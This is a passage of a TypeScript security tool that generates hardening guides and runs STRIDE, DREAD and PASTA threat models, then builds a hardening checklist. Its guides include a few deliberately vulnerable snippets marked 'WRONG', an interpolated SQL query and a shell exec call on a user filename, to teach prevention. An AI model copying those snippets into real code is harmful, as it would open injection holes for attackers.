  const counts: Record<string, number> = { critical: 0, high: 0, medium: 0, low: 0, info: 0 }
  for (const f of findings) {
    counts[f.severity] = (counts[f.severity] || 0) + 1
  }
  return counts
}

// ── Blue Team: Hardening Code Generators ───────────────────────────────────────

function generateSecurityHeaders(): string {
  return `
## Security Headers Middleware

### Express.js (using helmet)

\`\`\`typescript
import helmet from 'helmet'

app.use(helmet({
  contentSecurityPolicy: {
    directives: {
      defaultSrc: ["'self'"],
      scriptSrc: ["'self'", "'strict-dynamic'"],
      styleSrc: ["'self'", "'unsafe-inline'"],
      imgSrc: ["'self'", "data:", "https:"],
      fontSrc: ["'self'"],
      objectSrc: ["'none'"],
      baseUri: ["'self'"],
      formAction: ["'self'"],
      frameAncestors: ["'none'"],
      upgradeInsecureRequests: [],
    },
  },
  crossOriginEmbedderPolicy: true,
  crossOriginOpenerPolicy: { policy: 'same-origin' },
  crossOriginResourcePolicy: { policy: 'same-origin' },
  dnsPrefetchControl: { allow: false },
  frameguard: { action: 'deny' },
  hsts: { maxAge: 31536000, includeSubDomains: true, preload: true },
  ieNoOpen: true,
  noSniff: true,
  originAgentCluster: true,
  permittedCrossDomainPolicies: { permittedPolicies: 'none' },
  referrerPolicy: { policy: 'strict-origin-when-cross-origin' },
  xssFilter: true,
}))
\`\`\`

### Fastify

\`\`\`typescript
import fastifyHelmet from '@fastify/helmet'

await app.register(fastifyHelmet, {
  contentSecurityPolicy: {
    directives: {
      defaultSrc: ["'self'"],
      scriptSrc: ["'self'"],
      styleSrc: ["'self'", "'unsafe-inline'"],
      imgSrc: ["'self'", "data:"],
    },
  },
  hsts: { maxAge: 31536000, includeSubDomains: true },
})
\`\`\`

### Next.js (next.config.js headers)

\`\`\`javascript
const securityHeaders = [
  { key: 'X-DNS-Prefetch-Control', value: 'off' },
  { key: 'Strict-Transport-Security', value: 'max-age=31536000; includeSubDomains; preload' },
  { key: 'X-Frame-Options', value: 'DENY' },
  { key: 'X-Content-Type-Options', value: 'nosniff' },
  { key: 'Referrer-Policy', value: 'strict-origin-when-cross-origin' },
  { key: 'Permissions-Policy', value: 'camera=(), microphone=(), geolocation=()' },
  { key: 'X-XSS-Protection', value: '0' }, // Disabled in favor of CSP
]

module.exports = {
  async headers() {
    return [{ source: '/:path*', headers: securityHeaders }]
  },
}
\`\`\`

### Nginx

\`\`\`nginx
add_header X-Frame-Options "DENY" always;
add_header X-Content-Type-Options "nosniff" always;
add_header X-XSS-Protection "0" always;
add_header Referrer-Policy "strict-origin-when-cross-origin" always;
add_header Strict-Transport-Security "max-age=31536000; includeSubDomains; preload" always;
add_header Content-Security-Policy "default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'" always;
add_header Permissions-Policy "camera=(), microphone=(), geolocation=()" always;
\`\`\`
`
}

function generateInputValidation(): string {
  return `
## Input Validation Patterns

### Zod Schema Validation (TypeScript)

\`\`\`typescript
import { z } from 'zod'

// Request validation schemas
const createUserSchema = z.object({
  email: z.string().email().max(255),
  password: z.string().min(12).max(128)
    .regex(/[A-Z]/, 'Must contain uppercase letter')
    .regex(/[a-z]/, 'Must contain lowercase letter')
    .regex(/[0-9]/, 'Must contain number')
    .regex(/[^A-Za-z0-9]/, 'Must contain special character'),
  name: z.string().min(1).max(100).trim(),
})

const paginationSchema = z.object({
  page: z.coerce.number().int().min(1).max(1000).default(1),
  limit: z.coerce.number().int().min(1).max(100).default(20),
  sort: z.enum(['created_at', 'updated_at', 'name']).default('created_at'),
  order: z.enum(['asc', 'desc']).default('desc'),
})

// Express middleware
function validate<T extends z.ZodType>(schema: T) {
  return (req: Request, res: Response, next: NextFunction) => {
    const result = schema.safeParse(req.body)
    if (!result.success) {
      return res.status(400).json({
        error: 'Validation failed',
        details: result.error.issues.map(i => ({
          field: i.path.join('.'),
          message: i.message,
        })),
      })
    }
    req.body = result.data
    next()
  }
}

app.post('/api/users', validate(createUserSchema), createUserHandler)
\`\`\`

### Parameterized SQL Queries

\`\`\`typescript
// WRONG — SQL injection
const result = await db.query(\`SELECT * FROM users WHERE id = \${userId}\`)

// CORRECT — parameterized
const result = await db.query('SELECT * FROM users WHERE id = $1', [userId])

// CORRECT — using Prisma (automatically parameterized)
const user = await prisma.user.findUnique({ where: { id: userId } })

// CORRECT — using Drizzle
const user = await db.select().from(users).where(eq(users.id, userId))

// CORRECT — using Knex
const user = await knex('users').where('id', userId).first()
\`\`\`

### Path Traversal Prevention

\`\`\`typescript
import { resolve, relative } from 'path'

function safePath(baseDir: string, userPath: string): string {
  const resolved = resolve(baseDir, userPath)
  const rel = relative(baseDir, resolved)

  // Ensure resolved path is within base directory
  if (rel.startsWith('..') || resolve(resolved) !== resolved) {
    throw new Error('Path traversal attempt detected')
  }

  return resolved
}

// Usage
const filePath = safePath('/uploads', req.params.filename)
const content = readFileSync(filePath)
\`\`\`

### XSS Prevention

\`\`\`typescript
import DOMPurify from 'dompurify'

// Sanitize HTML input
function sanitizeHtml(dirty: string): string {
  return DOMPurify.sanitize(dirty, {
    ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a', 'p', 'br'],
    ALLOWED_ATTR: ['href', 'title'],
    ALLOW_DATA_ATTR: false,
  })
}

// React: avoid dangerouslySetInnerHTML
// If you must use it:
<div dangerouslySetInnerHTML={{ __html: sanitizeHtml(userContent) }} />

// Better: use a markdown renderer with sanitization
import ReactMarkdown from 'react-markdown'
<ReactMarkdown>{userContent}</ReactMarkdown>
\`\`\`

### Command Injection Prevention

\`\`\`typescript
import { execFile } from 'child_process'

// WRONG — command injection via exec
exec(\`convert \${userFilename} output.png\`)

// CORRECT — execFile (no shell interpretation)
execFile('convert', [userFilename, 'output.png'], (error, stdout) => {
  // safe: arguments are passed as array, not through shell
})

// CORRECT — validate arguments
const ALLOWED_FORMATS = ['png', 'jpg', 'gif', 'webp']
if (!ALLOWED_FORMATS.includes(format)) {
  throw new Error('Invalid format')
}
\`\`\`

### SSRF Prevention

\`\`\`typescript
import { URL } from 'url'
import { isIPv4 } from 'net'

function isPrivateIP(hostname: string): boolean {
  // Block private/internal IP ranges
  const privateRanges = [
    /^10\\./, /^172\\.(1[6-9]|2\\d|3[01])\\./, /^192\\.168\\./,
    /^127\\./, /^169\\.254\\./, /^0\\./, /^::1$/, /^fc00:/,
    /^fe80:/, /^localhost$/i,
  ]
  return privateRanges.some(r => r.test(hostname))
}

function validateUrl(input: string): URL {
  const url = new URL(input)
  if (!['http:', 'https:'].includes(url.protocol)) {
    throw new Error('Only HTTP(S) protocols allowed')
  }
  if (isPrivateIP(url.hostname)) {
    throw new Error('Internal URLs are not allowed')
  }
  return url
}
\`\`\`
`
}

function generateAuthHardening(): string {
  return `
## Authentication Hardening

### Rate Limiting (Express)

\`\`\`typescript
import rateLimit from 'express-rate-limit'
import RedisStore from 'rate-limit-redis'

// Global rate limiter
const globalLimiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15 minutes
  max: 100,
  standardHeaders: true,
  legacyHeaders: false,
  message: { error: 'Too many requests, please try again later' },
})

// Strict limiter for auth endpoints
const authLimiter = rateLimit({
  windowMs: 15 * 60 * 1000,
  max: 5, // 5 attempts per 15 min
  standardHeaders: true,
  skipSuccessfulRequests: true,
  message: { error: 'Too many login attempts, please try again in 15 minutes' },
  // Use Redis for distributed rate limiting
  store: new RedisStore({ sendCommand: (...args) => redisClient.sendCommand(args) }),
})

app.use('/api/', globalLimiter)
app.post('/api/auth/login', authLimiter, loginHandler)
app.post('/api/auth/register', authLimiter, registerHandler)
app.post('/api/auth/reset-password', authLimiter, resetHandler)
\`\`\`

### CSRF Protection

\`\`\`typescript
import csrf from 'csurf'

// Cookie-based CSRF (for traditional apps)
app.use(csrf({ cookie: { httpOnly: true, secure: true, sameSite: 'strict' } }))

// For SPAs: Double-submit cookie pattern
function csrfMiddleware(req: Request, res: Response, next: NextFunction) {
  const csrfCookie = req.cookies['csrf-token']
  const csrfHeader = req.headers['x-csrf-token']

  if (req.method !== 'GET' && csrfCookie !== csrfHeader) {
    return res.status(403).json({ error: 'CSRF validation failed' })
  }
  next()
}
\`\`\`

### Secure Session Configuration

\`\`\`typescript
import session from 'express-session'
import RedisStore from 'connect-redis'

app.use(session({
  store: new RedisStore({ client: redisClient }),
  name: '__session',  // Don't use default 'connect.sid'
  secret: process.env.SESSION_SECRET!,
  resave: false,
  saveUninitialized: false,
  rolling: true,
  cookie: {
    httpOnly: true,
    secure: process.env.NODE_ENV === 'production',
    sameSite: 'strict',
    maxAge: 24 * 60 * 60 * 1000, // 24 hours
    domain: process.env.COOKIE_DOMAIN,
    path: '/',
  },
}))

// Regenerate session after login (prevent fixation)
app.post('/api/auth/login', async (req, res) => {
  const user = await authenticateUser(req.body)
  if (!user) return res.status(401).json({ error: 'Invalid credentials' })

  req.session.regenerate((err) => {
    if (err) return res.status(500).json({ error: 'Session error' })
    req.session.userId = user.id
    req.session.save(() => {
      res.json({ success: true })
    })
  })
})
\`\`\`

### Password Hashing (Argon2)

\`\`\`typescript
import argon2 from 'argon2'

async function hashPassword(password: string): Promise<string> {
  return argon2.hash(password, {
    type: argon2.argon2id,  // Recommended variant
    memoryCost: 65536,       // 64 MB
    timeCost: 3,             // 3 iterations
    parallelism: 4,          // 4 threads
  })
}

async function verifyPassword(hash: string, password: string): Promise<boolean> {
  return argon2.verify(hash, password)
}

// Alternative: bcrypt
import bcrypt from 'bcrypt'
const SALT_ROUNDS = 12

async function hashPasswordBcrypt(password: string): Promise<string> {
  return bcrypt.hash(password, SALT_ROUNDS)
}
\`\`\`

### JWT Best Practices

\`\`\`typescript
import jwt from 'jsonwebtoken'

const JWT_SECRET = process.env.JWT_SECRET! // 64+ bytes random
const JWT_REFRESH_SECRET = process.env.JWT_REFRESH_SECRET!

function generateTokens(userId: string) {
  const accessToken = jwt.sign({ sub: userId, type: 'access' }, JWT_SECRET, {
    expiresIn: '15m',
    algorithm: 'HS256',
    issuer: 'your-app',
    audience: 'your-app',
  })

  const refreshToken = jwt.sign({ sub: userId, type: 'refresh' }, JWT_REFRESH_SECRET, {
    expiresIn: '7d',
    algorithm: 'HS256',
    jwtid: crypto.randomUUID(), // Unique ID for revocation
  })

  return { accessToken, refreshToken }
}

function verifyToken(token: string): jwt.JwtPayload {
  return jwt.verify(token, JWT_SECRET, {
    algorithms: ['HS256'], // Prevent algorithm confusion
    issuer: 'your-app',
    audience: 'your-app',
  }) as jwt.JwtPayload
}
\`\`\`
`
}

function generateCryptoBestPractices(): string {
  return `
## Cryptography Best Practices

### Symmetric Encryption (AES-256-GCM)

\`\`\`typescript
import { createCipheriv, createDecipheriv, randomBytes } from 'crypto'

const ALGORITHM = 'aes-256-gcm'
const KEY = Buffer.from(process.env.ENCRYPTION_KEY!, 'hex') // 32 bytes

function encrypt(plaintext: string): { ciphertext: string; iv: string; tag: string } {
  const iv = randomBytes(16) // Always random IV
  const cipher = createCipheriv(ALGORITHM, KEY, iv)

  let ciphertext = cipher.update(plaintext, 'utf8', 'hex')
  ciphertext += cipher.final('hex')

  const tag = cipher.getAuthTag().toString('hex')

  return {
    ciphertext,
    iv: iv.toString('hex'),
    tag,
  }
}

function decrypt(ciphertext: string, iv: string, tag: string): string {
  const decipher = createDecipheriv(ALGORITHM, KEY, Buffer.from(iv, 'hex'))
  decipher.setAuthTag(Buffer.from(tag, 'hex'))

  let plaintext = decipher.update(ciphertext, 'hex', 'utf8')
  plaintext += decipher.final('utf8')

  return plaintext
}
\`\`\`

### Key Derivation (PBKDF2 / scrypt)

\`\`\`typescript
import { scrypt, randomBytes } from 'crypto'
import { promisify } from 'util'

const scryptAsync = promisify(scrypt)

async function deriveKey(password: string, salt?: Buffer): Promise<{ key: Buffer; salt: Buffer }> {
  const useSalt = salt || randomBytes(32)
  const key = await scryptAsync(password, useSalt, 32) as Buffer
  return { key, salt: useSalt }
}
\`\`\`

### Secure Random Generation

\`\`\`typescript
import { randomBytes, randomUUID } from 'crypto'

// Secure token generation
function generateToken(length = 32): string {
  return randomBytes(length).toString('hex')
}

// Secure session ID
function generateSessionId(): string {
  return randomUUID()
}

// WRONG — never use for security
// Math.random().toString(36) // predictable!
\`\`\`

### Hash Comparison (Timing-Safe)

\`\`\`typescript
import { timingSafeEqual, createHmac } from 'crypto'

function verifySignature(payload: string, signature: string, secret: string): boolean {
  const expected = createHmac('sha256', secret).update(payload).digest()
  const received = Buffer.from(signature, 'hex')

  if (expected.length !== received.length) return false
  return timingSafeEqual(expected, received)
}
\`\`\`
`
}

function generateLoggingPatterns(): string {
  return `
## Security Logging & Monitoring

### Structured Security Event Logging

\`\`\`typescript
import { createLogger, format, transports } from 'winston'

const securityLogger = createLogger({
  level: 'info',
  format: format.combine(
    format.timestamp(),
    format.json(),
  ),
  defaultMeta: { service: 'security' },
  transports: [
    new transports.File({ filename: 'logs/security.log' }),
    new transports.File({ filename: 'logs/security-errors.log', level: 'error' }),
  ],
})

// Security event types
type SecurityEvent =
  | 'auth.login.success'
  | 'auth.login.failure'
  | 'auth.logout'
  | 'auth.password.change'
  | 'auth.password.reset'
  | 'auth.mfa.enable'
  | 'auth.mfa.verify.failure'
  | 'auth.session.expired'
  | 'auth.token.revoked'
  | 'access.denied'
  | 'access.privilege.escalation'
  | 'input.validation.failure'
  | 'rate.limit.exceeded'
  | 'csrf.validation.failure'
  | 'suspicious.activity'

interface SecurityLogEntry {
  event: SecurityEvent
  userId?: string
  ip: string
  userAgent: string
  resource?: string
  details?: Record<string, unknown>
}

function logSecurityEvent(entry: SecurityLogEntry): void {
  securityLogger.info('security_event', {
    ...entry,
    timestamp: new Date().toISOString(),
  })
}

// Usage examples
logSecurityEvent({
  event: 'auth.login.failure',
  ip: req.ip,
  userAgent: req.headers['user-agent'] || 'unknown',
  details: { email: req.body.email, reason: 'invalid_password' },
})

logSecurityEvent({
  event: 'rate.limit.exceeded',
  ip: req.ip,
  userAgent: req.headers['user-agent'] || 'unknown',
  resource: req.path,
  details: { limit: 5, window: '15m' },
})
\`\`\`

### Audit Trail Middleware

\`\`\`typescript
function auditTrail(req: Request, res: Response, next: NextFunction) {
  const startTime = Date.now()

  res.on('finish', () => {
    const duration = Date.now() - startTime
    const entry = {
      method: req.method,
      path: req.path,
      statusCode: res.statusCode,
      duration,
      ip: req.ip,
      userId: (req as any).user?.id,
      userAgent: req.headers['user-agent'],
    }

    // Log all non-GET requests and all auth failures
    if (req.method !== 'GET' || res.statusCode === 401 || res.statusCode === 403) {
      securityLogger.info('audit', entry)
    }
  })

  next()
}

app.use(auditTrail)
\`\`\`

### Anomaly Detection Hooks

\`\`\`typescript
// Track failed login attempts per IP
const failedAttempts = new Map<string, { count: number; firstAt: number }>()

function detectBruteForce(ip: string): boolean {
  const now = Date.now()
  const window = 15 * 60 * 1000 // 15 minutes
  const threshold = 10

  const record = failedAttempts.get(ip)
  if (!record || now - record.firstAt > window) {
    failedAttempts.set(ip, { count: 1, firstAt: now })
    return false
  }

  record.count++
  if (record.count >= threshold) {
    logSecurityEvent({
      event: 'suspicious.activity',
      ip,
      userAgent: 'system',
      details: {
        type: 'brute_force',
        attempts: record.count,
        window: '15m',
        action: 'ip_blocked',
      },
    })
    return true
  }
  return false
}

// Track impossible travel (same user, different geolocations)
function detectImpossibleTravel(userId: string, currentIp: string, lastIp: string, lastLoginAt: Date): boolean {
  // Implementation would use a GeoIP database
  // Flag if user logs in from two distant locations within a short time
  return false // placeholder
}
\`\`\`
`
}

// ── Threat Modeling ────────────────────────────────────────────────────────────

interface ThreatEntry {
  category: string
  threat: string
  description: string
  affected: string[]
  severity: 'critical' | 'high' | 'medium' | 'low' | 'info'
  mitigation: string
}

function analyzeSTRIDE(files: FileEntry[], baseDir: string): ThreatEntry[] {
  const threats: ThreatEntry[] = []

  // Analyze file structure for data flows and trust boundaries
  const hasAuth = files.some(f => /(?:auth|login|session|jwt|passport|oauth)/i.test(f.path))
  const hasApi = files.some(f => /(?:api|route|endpoint|controller|handler)/i.test(f.path))
  const hasDb = files.some(f => /(?:database|db|model|schema|migration|prisma|drizzle|sequelize|knex)/i.test(f.path))
  const hasFileUpload = files.some(f => /(?:upload|multer|formidable|busboy)/i.test(f.content))
  const hasPayments = files.some(f => /(?:stripe|payment|billing|invoice|checkout)/i.test(f.content))
  const hasWebSocket = files.some(f => /(?:websocket|socket\.io|ws\.|wss:)/i.test(f.content))
  const hasEmail = files.some(f => /(?:nodemailer|sendgrid|ses|smtp|email)/i.test(f.content))
  const hasCrypto = files.some(f => /(?:encrypt|decrypt|cipher|hash|sign|verify)/i.test(f.content))
  const hasExternalApi = files.some(f => /(?:fetch|axios|got|request|http\.get)/i.test(f.content))
  const hasAdmin = files.some(f => /(?:admin|dashboard|manage|panel|backoffice)/i.test(f.path))
  const hasDocker = files.some(f => f.path.toLowerCase().includes('docker'))
  const hasCi = files.some(f => /(?:\.github\/workflows|\.gitlab-ci|jenkinsfile|\.circleci)/i.test(f.path))

  // S — Spoofing
  if (hasAuth) {
    threats.push({
      category: 'Spoofing',
      threat: 'Identity Spoofing via Credential Theft',
      description: 'Attacker steals or guesses user credentials to impersonate legitimate users',
      affected: files.filter(f => /(?:auth|login|session)/i.test(f.path)).map(f => relative(baseDir, f.path)),
      severity: 'high',
      mitigation: 'Implement MFA, use strong password policies, implement account lockout after failed attempts',
    })
    threats.push({
      category: 'Spoofing',
      threat: 'Session Hijacking',
      description: 'Attacker steals session tokens via XSS, network sniffing, or cookie theft',
      affected: files.filter(f => /(?:session|cookie|token)/i.test(f.content)).map(f => relative(baseDir, f.path)).slice(0, 5),
      severity: 'high',
      mitigation: 'Use httpOnly, secure, sameSite cookies. Implement session rotation. Use short-lived tokens.',
    })
  }
  if (hasApi) {
    threats.push({
      category: 'Spoofing',
      threat: 'API Key Impersonation',
      description: 'Attacker uses leaked or stolen API keys to access protected endpoints',
      affected: files.filter(f => /(?:api|route|endpoint)/i.test(f.path)).map(f => relative(baseDir, f.path)).slice(0, 5),
      severity: 'high',
      mitigation: 'Rotate API keys regularly. Use scoped keys with minimum permissions. Monitor for anomalous usage.',
    })
  }
  if (hasEmail) {
    threats.push({
      category: 'Spoofing',
      threat: 'Email Spoofing / Phishing',
      description: 'Attacker sends emails appearing to be from the application to trick users',
      affected: files.filter(f => /(?:email|mail|smtp)/i.test(f.content)).map(f => relative(baseDir, f.path)).slice(0, 3),
      severity: 'medium',
      mitigation: 'Configure SPF, DKIM, DMARC for email domain. Validate sender addresses.',
    })
  }

  // T — Tampering
  if (hasDb) {
    threats.push({
      category: 'Tampering',
      threat: 'Database Record Manipulation',
      description: 'Attacker modifies database records through SQL injection or direct access',
      affected: files.filter(f => /(?:database|db|model|schema|query)/i.test(f.path) || /(?:query|sql|select|insert|update|delete)/i.test(f.content)).map(f => relative(baseDir, f.path)).slice(0, 5),
      severity: 'critical',
      mitigation: 'Use parameterized queries. Implement row-level security. Enable audit logging on all tables.',
    })
  }
  if (hasApi) {
    threats.push({
      category: 'Tampering',
      threat: 'API Request Tampering',
      description: 'Attacker modifies request parameters, headers, or body to bypass validation',
      affected: files.filter(f => /(?:api|route|endpoint|controller)/i.test(f.path)).map(f => relative(baseDir, f.path)).slice(0, 5),
      severity: 'high',
      mitigation: 'Validate all inputs server-side with schema validation (zod). Never trust client-side validation alone.',
    })
  }
  if (hasFileUpload) {
    threats.push({
      category: 'Tampering',
      threat: 'Malicious File Upload',
      description: 'Attacker uploads executable files, web shells, or files with manipulated headers',
      affected: files.filter(f => /(?:upload|multer|formidable)/i.test(f.content)).map(f => relative(baseDir, f.path)),
      severity: 'high',
      mitigation: 'Validate file type by magic bytes. Restrict extensions. Store outside webroot. Scan for malware.',
    })
  }
  if (hasCi) {
    threats.push({
      category: 'Tampering',
      threat: 'CI/CD Pipeline Tampering',
      description: 'Attacker modifies CI/CD configuration or injects malicious build steps',
      affected: files.filter(f => /(?:\.github\/workflows|\.gitlab-ci|jenkinsfile)/i.test(f.path)).map(f => relative(baseDir, f.path)),
      severity: 'critical',
      mitigation: 'Require PR reviews for CI config changes. Pin action/image versions. Use signed commits.',
    })
  }

  // R — Repudiation
  if (hasAuth || hasApi) {
    threats.push({
      category: 'Repudiation',
      threat: 'Insufficient Audit Logging',
      description: 'Lack of comprehensive logging makes it impossible to trace malicious actions',
      affected: ['application-wide'],
      severity: 'medium',
      mitigation: 'Implement structured security logging. Log all auth events, data modifications, and admin actions with timestamps, user IDs, and IP addresses.',
    })
  }
  if (hasPayments) {
    threats.push({
      category: 'Repudiation',
      threat: 'Transaction Repudiation',
      description: 'User denies making a financial transaction due to lack of proof',
      affected: files.filter(f => /(?:payment|billing|invoice|transaction)/i.test(f.content)).map(f => relative(baseDir, f.path)),
      severity: 'high',
      mitigation: 'Log all transactions with full audit trail. Use digital signatures for critical operations. Store transaction receipts.',
    })
  }

  // I — Information Disclosure
  threats.push({
    category: 'Information Disclosure',
    threat: 'Sensitive Data Exposure via Error Messages',
    description: 'Application leaks internal details through error messages, stack traces, or debug output',
    affected: ['application-wide'],
    severity: 'medium',
    mitigation: 'Use generic error messages in production. Log detailed errors server-side only. Disable debug mode.',
  })
  if (hasDb) {
    threats.push({
      category: 'Information Disclosure',
      threat: 'Database Credential Exposure',
      description: 'Database connection strings or credentials leaked through source code, logs, or config files',
      affected: files.filter(f => /(?:database|db|\.env|config)/i.test(f.path)).map(f => relative(baseDir, f.path)).slice(0, 5),
      severity: 'critical',
      mitigation: 'Store credentials in environment variables or secrets manager. Never commit .env files.',
    })
  }
  if (hasCrypto) {
    threats.push({
      category: 'Information Disclosure',
      threat: 'Cryptographic Key Exposure',
      description: 'Encryption keys leaked through source code, logs, or insecure storage',
      affected: files.filter(f => /(?:key|secret|encrypt|cipher)/i.test(f.content)).map(f => relative(baseDir, f.path)).slice(0, 5),
      severity: 'critical',
      mitigation: 'Use key management services (AWS KMS, Vault). Never hardcode keys. Rotate regularly.',
    })
  }
  if (hasExternalApi) {
    threats.push({
      category: 'Information Disclosure',
      threat: 'Data Leakage to Third Parties',
      description: 'Sensitive user data inadvertently sent to external APIs or analytics services',
      affected: files.filter(f => /(?:fetch|axios|analytics|tracking)/i.test(f.content)).map(f => relative(baseDir, f.path)).slice(0, 5),
      severity: 'medium',
      mitigation: 'Audit all external API calls. Minimize data sent. Review third-party privacy policies.',
    })
  }

  // D — Denial of Service
  if (hasApi) {
    threats.push({
      category: 'Denial of Service',
      threat: 'API Rate Limit Bypass',
      description: 'Attacker overwhelms API endpoints with excessive requests',
      affected: files.filter(f => /(?:api|route|endpoint)/i.test(f.path)).map(f => relative(baseDir, f.path)).slice(0, 5),
      severity: 'high',
      mitigation: 'Implement rate limiting per IP and per user. Use CDN for static assets. Add request size limits.',
    })
  }
  if (hasFileUpload) {
    threats.push({
      category: 'Denial of Service',
      threat: 'Resource Exhaustion via Large Uploads',
      description: 'Attacker uploads extremely large files to exhaust disk space or memory',
      affected: files.filter(f => /(?:upload|multer|formidable)/i.test(f.content)).map(f => relative(baseDir, f.path)),
      severity: 'medium',
      mitigation: 'Set strict file size limits. Use streaming uploads. Implement disk quotas per user.',
    })
  }
  if (hasWebSocket) {
    threats.push({
      category: 'Denial of Service',
      threat: 'WebSocket Flood',
      description: 'Attacker opens many WebSocket connections or sends rapid messages',
      affected: files.filter(f => /(?:websocket|socket\.io|ws)/i.test(f.content)).map(f => relative(baseDir, f.path)),
      severity: 'medium',
      mitigation: 'Limit connections per IP. Implement message rate limiting. Add heartbeat/timeout.',
    })
  }
  threats.push({
    category: 'Denial of Service',
    threat: 'Regular Expression Denial of Service (ReDoS)',
    description: 'User-supplied input causes catastrophic regex backtracking',
    affected: ['application-wide — any regex processing user input'],
    severity: 'medium',
    mitigation: 'Avoid user input in regex construction. Use RE2 engine. Set execution timeouts.',
  })

  // E — Elevation of Privilege
  if (hasAuth && hasAdmin) {
    threats.push({
      category: 'Elevation of Privilege',
      threat: 'Horizontal Privilege Escalation',
      description: 'User accesses resources belonging to another user of the same role',
      affected: files.filter(f => /(?:api|route|controller)/i.test(f.path)).map(f => relative(baseDir, f.path)).slice(0, 5),
      severity: 'high',
      mitigation: 'Always check resource ownership. Use row-level security. Never rely on client-provided user IDs.',
    })
    threats.push({
      category: 'Elevation of Privilege',
      threat: 'Vertical Privilege Escalation (User to Admin)',
      description: 'Regular user gains admin access through role manipulation or IDOR',
      affected: files.filter(f => /(?:admin|role|permission|rbac)/i.test(f.content)).map(f => relative(baseDir, f.path)).slice(0, 5),
      severity: 'critical',
      mitigation: 'Validate roles server-side on every request. Use RBAC with principle of least privilege. Audit role changes.',
    })
  }
  if (hasDocker) {
    threats.push({
      category: 'Elevation of Privilege',
      threat: 'Container Escape',
      description: 'Attacker escapes Docker container to access host system',
      affected: files.filter(f => /docker/i.test(f.path)).map(f => relative(baseDir, f.path)),
      severity: 'critical',
      mitigation: 'Use non-root user in containers. Drop capabilities. Use read-only filesystem. Enable seccomp/AppArmor.',
    })
  }
  threats.push({
    category: 'Elevation of Privilege',
    threat: 'Dependency Hijacking',
    description: 'Attacker compromises a dependency to execute malicious code in the application context',
    affected: ['package.json', 'package-lock.json'],
    severity: 'high',
    mitigation: 'Pin dependencies. Use lock files. Run npm audit. Enable Dependabot/Renovate. Verify package integrity.',
  })

  return threats
}

function analyzeDREAD(files: FileEntry[], baseDir: string): ThreatEntry[] {
  // DREAD: Damage, Reproducibility, Exploitability, Affected Users, Discoverability
  // We reuse STRIDE findings but score them with DREAD metrics
  const strideThreats = analyzeSTRIDE(files, baseDir)

  // Add DREAD scoring context to descriptions
  return strideThreats.map(t => ({
    ...t,
    description: `${t.description}\n\n**DREAD Score**: Damage=${dreadScore(t.severity, 'damage')}/10, Reproducibility=${dreadScore(t.severity, 'repro')}/10, Exploitability=${dreadScore(t.severity, 'exploit')}/10, Affected Users=${dreadScore(t.severity, 'affected')}/10, Discoverability=${dreadScore(t.severity, 'discover')}/10`,
  }))
}

function dreadScore(severity: string, dimension: string): number {
  const base: Record<string, number> = { critical: 9, high: 7, medium: 5, low: 3 }
  const s = base[severity] || 5
  switch (dimension) {
    case 'damage': return s
    case 'repro': return Math.min(10, s + 1)
    case 'exploit': return Math.max(1, s - 1)
    case 'affected': return s
    case 'discover': return Math.min(10, s + 2)
    default: return s
  }
}

function analyzePASTA(files: FileEntry[], baseDir: string): ThreatEntry[] {
  // PASTA: Process for Attack Simulation and Threat Analysis
  // 7 stages: Define Objectives, Define Technical Scope, App Decomposition,
  // Threat Analysis, Vulnerability Analysis, Attack Modeling, Risk Analysis

  const strideThreats = analyzeSTRIDE(files, baseDir)

  // Enrich with PASTA-specific context
  const hasPackageJson = files.some(f => f.path.endsWith('package.json'))
  const techStack: string[] = []
  if (files.some(f => f.ext === '.ts' || f.ext === '.tsx')) techStack.push('TypeScript')
  if (files.some(f => f.ext === '.py')) techStack.push('Python')
  if (files.some(f => f.ext === '.go')) techStack.push('Go')
  if (files.some(f => f.ext === '.java')) techStack.push('Java')
  if (files.some(f => f.ext === '.rb')) techStack.push('Ruby')
  if (files.some(f => f.ext === '.rs')) techStack.push('Rust')
  if (files.some(f => f.ext === '.php')) techStack.push('PHP')
  if (files.some(f => /react|jsx|tsx/i.test(f.path))) techStack.push('React')
  if (files.some(f => /express/i.test(f.content))) techStack.push('Express.js')
  if (files.some(f => /next/i.test(f.path))) techStack.push('Next.js')
  if (files.some(f => /django/i.test(f.content))) techStack.push('Django')
  if (files.some(f => /flask/i.test(f.content))) techStack.push('Flask')
  if (files.some(f => /fastify/i.test(f.content))) techStack.push('Fastify')

  // Add PASTA stage context
  const pastaThreats: ThreatEntry[] = [
    {
      category: 'PASTA Stage 1 — Business Objectives',
      threat: 'Business Impact Assessment',
      description: `Application uses: ${techStack.join(', ') || 'unknown stack'}. Total files scanned: ${files.length}. Threat analysis identifies ${strideThreats.length} potential threats across ${new Set(strideThreats.map(t => t.category)).size} categories.`,
      affected: ['application-wide'],
      severity: 'info',
      mitigation: 'Review each threat against business risk tolerance. Prioritize based on business impact.',
    },
    {
      category: 'PASTA Stage 2 — Technical Scope',
      threat: 'Attack Surface Enumeration',
      description: `Tech stack: ${techStack.join(', ')}. Entry points: API routes, WebSocket handlers, file uploads, authentication endpoints, admin panels.`,
      affected: ['application-wide'],
      severity: 'info',
      mitigation: 'Map all entry points and data flows. Identify trust boundaries between components.',
    },
    ...strideThreats,
  ]

  return pastaThreats
}

// ── Security Checklist Generators ──────────────────────────────────────────────

function generateChecklist(framework: string): string {
  const lines: string[] = ['# Security Hardening Checklist', '']

  // Universal checks
  lines.push('## 1. Authentication & Authorization')
  lines.push('- [ ] All endpoints require authentication (except public routes)')
  lines.push('- [ ] Role-based access control (RBAC) implemented')
  lines.push('- [ ] Password minimum length >= 12 characters')
  lines.push('- [ ] Password complexity requirements enforced')
  lines.push('- [ ] Account lockout after 5 failed login attempts')
  lines.push('- [ ] MFA available and encouraged')
  lines.push('- [ ] Session timeout configured (max 24h, 15min for idle)')
  lines.push('- [ ] Session regeneration after login')
  lines.push('- [ ] Password reset via secure token (not email link with password)')
  lines.push('- [ ] OAuth/OIDC state parameter validated')
  lines.push('- [ ] JWT: no "none" algorithm, short expiry, proper validation')
  lines.push('- [ ] API keys: scoped, rotatable, hashed in storage')
  lines.push('')

  lines.push('## 2. Input Validation & Output Encoding')
  lines.push('- [ ] All user input validated server-side (never trust client)')
  lines.push('- [ ] Schema validation on all API endpoints (zod/joi/ajv)')
  lines.push('- [ ] Parameterized queries for ALL database operations')
  lines.push('- [ ] Output encoding for HTML, JavaScript, URL, CSS contexts')
  lines.push('- [ ] File upload: type validation by magic bytes, size limits')
  lines.push('- [ ] URL validation for redirects (allowlist domains)')
  lines.push('- [ ] HTML sanitization for any user-generated rich content')
